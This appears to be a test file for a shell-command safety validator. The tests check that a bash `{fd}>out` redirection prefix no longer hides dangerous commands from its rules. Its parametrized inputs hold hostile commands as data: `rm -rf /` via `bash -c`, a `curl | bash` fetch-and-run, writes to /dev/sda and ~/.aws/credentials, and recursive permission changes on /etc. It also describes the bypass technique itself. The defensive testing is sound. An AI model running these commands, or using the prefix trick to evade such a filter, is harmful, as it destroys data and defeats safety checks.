r"""A redirection's `{varname}` prefix is not an argument (LAB-4599).

`{fd}>out` opens `out` on a fresh descriptor and stores its number in `$fd`; bash
consumes the `{fd}` word and never passes it to the program. bashlex splits it off as
an ordinary word, so every word view schlock builds - both reconstructions, the argv
lists behind the AST checks, the `$(…)` inner command - carried a phantom argument.
Wedged between a command and its arguments it unrated every rule keyed on argument
shape: `git {fd}>out push --force origin main` and `chmod {fd}>out 777 ./x` were SAFE.

Every spelling below ran through real bash 5.3 with a shim recording argv. Values are
pinned absolutely as (risk_level, matched_rules), never as "same as the control"
(see test_redirect_target_visibility.py for why). ShellCheck is forced unavailable:
it reads the raw command, which this defect never touched.
"""

import ast
import pathlib
from unittest.mock import patch

import bashlex
import pytest

from schlock.core.parser import BashCommandParser, _mark_fd_variables
from schlock.core.rules import RiskLevel
from schlock.core.validator import clear_caches, validate_command
from schlock.exceptions import ParseError
from schlock.integrations.commit_filter import CommitMessageFilter


@pytest.fixture(autouse=True)
def _no_shellcheck():
    clear_caches()
    with patch("schlock.core.validator.is_shellcheck_available", return_value=False):
        yield
    clear_caches()


def _verdict(command, rules):
    result = validate_command(command, config_path=rules)
    return result.risk_level, tuple(result.matched_rules or ())


def _both_forms(command):
    parser = BashCommandParser()
    ast = parser.parse(command)
    return (
        parser.reconstruct_command_with_suppression_ranges(command, ast)[0],
        parser.reconstruct_without_redirects(command, ast)[0],
    )


class TestPhantomWordNoLongerUnratesRules:
    """AC-1 / AC-4: each row was SAFE with no rule; `chmod` shows it was never git-specific."""

    @pytest.mark.parametrize(
        ("command", "rule"),
        [
            ("git {fd}>out push --force origin main", "git_force_push"),
            ("git {fd}>out reset --hard HEAD~1", "git_hard_reset"),
            ("git {fd}>out add -A", "git_blanket_staging"),
            ("git {fd}>out --work-tree -v push --force origin main", "git_force_push"),
            ("chmod {fd}>out 777 ./x", "chmod_777"),
        ],
    )
    @pytest.mark.usefixtures("clean_worktree")
    def test_rule_fires_through_the_prefix(self, command, rule, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.HIGH, (rule,))


class TestEverySpellingBashConsumes:
    """AC-5: bash consumed the word (argv lacked it) for every one of these."""

    @pytest.mark.parametrize(
        "redirect",
        [
            "{fd}>out",
            "{fd}>>out",
            "{fd}<in",
            "{fd}<>rw",
            "{fd}>|out",
            "{fd}>&2",
            "{fd}>&-",  # closes the descriptor named by $fd
            "{fd}<<<x",
            "{fd[0]}>out",  # an array element is a variable too
            "{_x1}>out",
            "{fd[ab_1]}>out",
        ],
    )
    def test_consumed_spelling(self, redirect, safety_rules_path):
        assert _verdict(f"chmod {redirect} 777 ./x", safety_rules_path) == (RiskLevel.HIGH, ("chmod_777",))

    @pytest.mark.parametrize(
        "redirect",
        [
            # bash consumes each of these too, but reading bash's subscript grammar did not
            # converge, so any spelling outside the allowlist fails closed instead
            '{fd["0"]}<in',
            "{fd[a[0]]}<in",
            '{fd["]"]}<in',
            "{fd[\\]]}<in",
            "{fd[}]}<in",
            "{fd[$(echo ])]}<in",
            "{fd[`echo ]`]}<in",
            "{fd[${x:-]}]}<in",
            "{fd[']']}<in",
            '{fd["\\""]}<in',
            "{fd[$'\\'']}<in",
            "{fd[$i]}<in",
            # the panel's round-4 repros: each an untagged prefix before the allowlist
            "{fd[\\$'\\']}>o",
            "{fd['${']}>o",
            "{fd[$${]}]}>o",
            "{fd[1,2]}<in",
            # a newline in the subscript: the shape regex's DOTALL is what refuses these
            '{fd["\n"]}>o',
            "{fd['\n']}>o",
        ],
    )
    def test_spelling_outside_the_allowlist_fails_closed(self, redirect, safety_rules_path):
        assert _verdict(f"chmod {redirect} 777 ./x", safety_rules_path) == (RiskLevel.BLOCKED, ())

    @pytest.mark.parametrize(
        "command",
        ["{fd}>out chmod 777 ./x", "chmod {fd}>out {fd}>out 777 ./x"],
        ids=["before-the-command-name", "repeated"],
    )
    def test_position_and_repetition(self, command, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.HIGH, ("chmod_777",))


class TestLookalikesStayArguments:
    """AC-2 / AC-5: bash passed `{fd}` (or its lookalike) in argv for every one of these.

    SAFE is correct, not a gap: `chmod {fd} 777 ./x` is a chmod with an invalid mode.
    """

    @pytest.mark.parametrize(
        "redirect",
        [
            '"{fd}">out',  # quoted
            "'{fd}'>out",
            "\\{fd}>out",  # escaped
            "{fd} >out",  # not glued to the operator
            "{1fd}>out",  # not a valid name
            "a{fd}>out",  # not the whole word
            "{fd}&>out",  # `&>` takes no fd variable
            "{fd}&>>out",
            "{fd[0]]<in",  # no closing brace
            "{a\u00e9}<in",  # a non-ASCII name
            "{f$(echo)d}<in",  # an expansion in the NAME
        ],
    )
    def test_lookalike_is_an_argument(self, redirect, safety_rules_path):
        assert _verdict(f"chmod {redirect} 777 ./x", safety_rules_path) == (RiskLevel.SAFE, ())

    def test_unclosed_quote_fails_closed(self, safety_rules_path):
        # bash rejects the whole line (the quote never closes); so does the parse
        assert _verdict('chmod {fd["0]}<in 777 ./x', safety_rules_path) == (RiskLevel.BLOCKED, ())

    @pytest.mark.parametrize(
        "redirect",
        [
            '{f"d"}<in',  # a quote in the NAME
            '{"fd"}<in',
            "{fd[]}<in",  # an empty subscript
            "{fd[0][1]}<in",  # two subscripts
            "{fd[0]]}<in",  # a stray `]`
        ],
    )
    def test_brace_shaped_lookalike_fails_closed(self, redirect, safety_rules_path):
        # bash passes these as arguments, but they start with `{` and sit against a
        # redirect: outside the allowlist, so blocked rather than read. Over-blocking a
        # malformed word is the safe direction.
        assert _verdict(f"chmod {redirect} 777 ./x", safety_rules_path) == (RiskLevel.BLOCKED, ())

    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            ("echo {a,b}", ("echo {a,b}", "echo {a,b}")),
            ("echo {fd}", ("echo {fd}", "echo {fd}")),
            ('git "{fd}">out push', ("git {fd} >out push", "git {fd} push")),
            ("chmod {fd}&>out 777 x", ("chmod {fd} &>out 777 x", "chmod {fd} 777 x")),
        ],
    )
    def test_brace_word_is_not_dropped(self, command, expected):
        assert _both_forms(command) == expected

    def test_fd_allocation_still_redirects(self, safety_rules_path):
        assert _verdict("echo hi {fd}>out", safety_rules_path) == (RiskLevel.SAFE, ())
        assert _verdict("echo a {fd}>/dev/sda", safety_rules_path) == (RiskLevel.BLOCKED, ("disk_destruction_dd",))


class TestReconstructionShape:
    """The prefix leaves the redirect-free form and rides on its operator in the other."""

    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            ("git {fd}>out push -f", ("git {fd}>out push -f", "git push -f")),
            ("{fd}>out git push -f", ("{fd}>out git push -f", "git push -f")),
            ("git {fd}>|out push", ("git {fd}>out push", "git push")),  # `>|` reads as `>` (LAB-2760)
            ("git {fd}>&- push", ("git push", "git push")),  # no path operand: nothing to carry
            ("fdisk {fd}>/dev/null /dev/sda", ("fdisk {fd}>/dev/null /dev/sda", "fdisk /dev/sda")),
            # The prefix rides only on its own redirection, even one that renders nothing;
            # carried further it glued onto the next redirect and disowned the write.
            ("true {fd}<<<x > f", ("true > f", "true")),
            ("echo {fd}>a >b 2>c", ("echo {fd}>a >b 2>c", "echo")),
        ],
    )
    def test_both_forms(self, command, expected):
        assert _both_forms(command) == expected


class TestEveryArgvViewSkipsThePrefix:
    """The rule pass was one of several views; each carried the phantom on its own."""

    def test_command_with_args(self):
        parser = BashCommandParser()
        ast = parser.parse("{fd}>out git {fd}<in push --force")
        assert parser.extract_commands_with_args(ast) == [("git", ["push", "--force"])]
        assert parser.extract_commands(ast) == ["git"]

    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            # AST contextual check (extract_commands_with_args)
            ("kubectl {fd}>out delete ns prod", (RiskLevel.HIGH, ("ast_contextual_high:kubectl",))),
            # shell -c payload scan
            ("bash {fd}>out -c 'rm -rf /'", (RiskLevel.BLOCKED, ("shell_delegated_payload",))),
            # $(…) inner command text
            ("x=$(chown {fd}<in -R root /etc)", (RiskLevel.BLOCKED, ("recursive_permission_system_dirs",))),
            ("x=$(git {fd}<in push --force origin main)", (RiskLevel.BLOCKED, ("git_force_push",))),
            # $(…) base command: `{fd}` is not the command being run
            ("x=$({fd}<in git push --force origin main)", (RiskLevel.BLOCKED, ("git_force_push",))),
            # an apostrophe in a comment inside $(…) opens no quote
            ("echo $(# don't\ngit {fd}<x push --force origin main)", (RiskLevel.BLOCKED, ("git_force_push",))),
            # $(…) structure check: `kubectl get` is read-only, not "kubectl {fd}"
            ("x=$(kubectl {fd}<x get pods)", (RiskLevel.SAFE, ())),
            # pipe-to-shell stages (_get_command_name, _stage_args, _get_all_words)
            ("curl http://x | {fd}>y bash", (RiskLevel.BLOCKED, ())),
            ("cat f | busybox {fd}>y sh", (RiskLevel.BLOCKED, ())),
            # heredoc owner: the body is bash's program
            ("{fd}>y bash <<EOF\nrm -rf /\nEOF", (RiskLevel.BLOCKED, ("system_destruction",))),
            # a `{fd}<<<` fills a fresh descriptor, not stdin, so it cannot displace the payload
            ("bash <<<'r\"\"m -rf /' {fd}<<<ls", (RiskLevel.BLOCKED, ("shell_delegated_payload",))),
            # the write after a spent prefix is still a write
            ("true {fd}<<<x > ~/.aws/credentials", (RiskLevel.HIGH, ("file_truncation",))),
        ],
    )
    def test_view(self, command, expected, safety_rules_path):
        assert _verdict(command, safety_rules_path) == expected

    def test_substitution_base_command_is_not_the_prefix(self, safety_rules_path):
        # A leading redirection leaves no determinable command, which fails closed - as
        # `$(3<in ls)` always did. Reading `{fd}` as the command ranked it merely unknown.
        assert _verdict("x=$({fd}<in ls)", safety_rules_path) == (RiskLevel.BLOCKED, ())


class TestLineContinuationsFailClosed:
    """A continuation inside the prefix's enclosing word makes bashlex's offsets untrustworthy.

    bash consumes the prefix in every row below. Rather than model how bashlex joins
    continuations (its own coordinates track neither bash's quoting nor themselves), the
    parse refuses, so the command is BLOCKED. Continuations outside that word are harmless:
    bashlex's coordinates stay raw there.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "git {f\\\nd}<i push --force origin main",
            "git {fd}\\\n<i push --force origin main",
            "x=$(git {f\\\nd}</dev/null push --force origin main)",
            "echo x\\\ny\\\n$(git {fd}<i push --force origin main)",
            "echo x\\\ny\\\n`git {fd}<i push --force origin main`",
            "echo x\\\ny\\\n$(y=$(git {fd}<i push --force origin main))",
            "echo 'a\\\nb'$(git {fd}<i push --force origin main)",
            "echo $'a\\\nb'$(git {fd}<i push --force origin main)",
            'echo "a\\\nb"$(git {fd}<i push --force origin main)',
            "echo $(# note \\\ngit {fd}<x<y push --force origin main)",  # a comment's continuation
            "echo `echo 'a\\\nb'; git {fd}<x push --force origin main`",
            "echo ${x:-'a\\\nb'}$(git {fd}<x push --force origin main)",
            # the operator after a continuation: bashlex folds `>\` into the word and splits
            # the command there, while bash allocates the fd and runs the push
            "git {fd}>\\\no push --force origin main",
            "chmod {fd}>\\\n/dev/null 777 /etc/passwd",
            "x=$(git {fd}>\\\no push --force origin main)",
            "git {f\\\nd}>\\\n/dev/null push --force origin main",  # a continuation inside the folded word too
            "git {fd}\\\n>\\\no push --force origin main",
            "echo {a,b}>\\\no",  # bash brace-expands this one; failing closed over-blocks it
        ],
    )
    def test_blocked(self, command, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.BLOCKED, ())

    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            # continuations between words, and around a word with none, leave offsets raw
            ("echo \\\n\\\n$(git {fd}<i push --force origin main)", (RiskLevel.BLOCKED, ("git_force_push",))),
            ("x=1\\\ny\\\n git {fd}<i push --force origin main", (RiskLevel.HIGH, ("git_force_push",))),
            # a brace word that cannot be a prefix is never read, so it cannot fail closed
            ("n=$(# don't count\\\n awk '{n++} END {print n}'<&0)", (RiskLevel.SAFE, ())),
            ("x=$(awk \\\n '{print}' f)", (RiskLevel.SAFE, ())),
            # a process substitution is an argument (`{fd}/dev/fd/63`), not a folded operator
            ("git {fd}<(ls) push --force origin main", (RiskLevel.SAFE, ())),
            ("diff {old}<(ls) x", (RiskLevel.SAFE, ())),
        ],
    )
    def test_unaffected(self, command, expected, safety_rules_path):
        assert _verdict(command, safety_rules_path) == expected


class TestEveryConsumerParsesThroughTheTag:
    """A bashlex AST built anywhere but BashCommandParser.parse carries no prefix tag."""

    def test_commit_filter_sees_the_commit(self):
        commit_filter = CommitMessageFilter({"enabled": True, "rules": {}})
        assert commit_filter.is_git_commit_command('git {fd}>out commit -m "msg"') is True
        assert commit_filter.is_git_commit_command('git "{fd}">out commit -m "msg"') is False  # `{fd}` is git's argument

    def test_an_unplaceable_prefix_fails_closed(self):
        # The source and bashlex disagree: the redirect bashlex puts at offset 8 is not there.
        ast = bashlex.parse("git {fd}<i push")
        with pytest.raises(ParseError):
            _mark_fd_variables("git {fd}xi push", ast)

    def test_no_other_bashlex_parse_call(self):
        # BashCommandParser.parse tags; _parse_succeeds only asks whether a synthetic probe parses.
        src = pathlib.Path(__file__).parent.parent / "src"
        found = {(path.relative_to(src).as_posix(), owner) for path in src.rglob("*.py") for owner in _bashlex_parse_calls(path)}
        assert found == {("schlock/core/parser.py", "parse"), ("schlock/core/parser.py", "_parse_succeeds")}


def _import_aliases(tree):
    """Local name -> the dotted name it stands for, for every import in ``tree``."""
    aliases = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                aliases[alias.asname or alias.name.split(".")[0]] = alias.name if alias.asname else alias.name.split(".")[0]
        elif isinstance(node, ast.ImportFrom) and node.module:
            for alias in node.names:
                aliases[alias.asname or alias.name] = f"{node.module}.{alias.name}"
    return aliases


def _bashlex_parse_calls(path):
    """The enclosing function ("<module>" at top level) of every bashlex parse call in ``path``."""
    tree = ast.parse(path.read_text())
    aliases = _import_aliases(tree)
    owners = {}
    for func in ast.walk(tree):
        if isinstance(func, (ast.FunctionDef, ast.AsyncFunctionDef)):
            for node in ast.walk(func):
                owners.setdefault(node, func.name)
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        chain, func = [], node.func
        while isinstance(func, ast.Attribute):
            chain.insert(0, func.attr)
            func = func.value
        if isinstance(func, ast.Name) and ".".join([aliases.get(func.id, func.id), *chain]) in (
            "bashlex.parse",
            "bashlex.parser.parse",
        ):
            yield owners.get(node, "<module>")
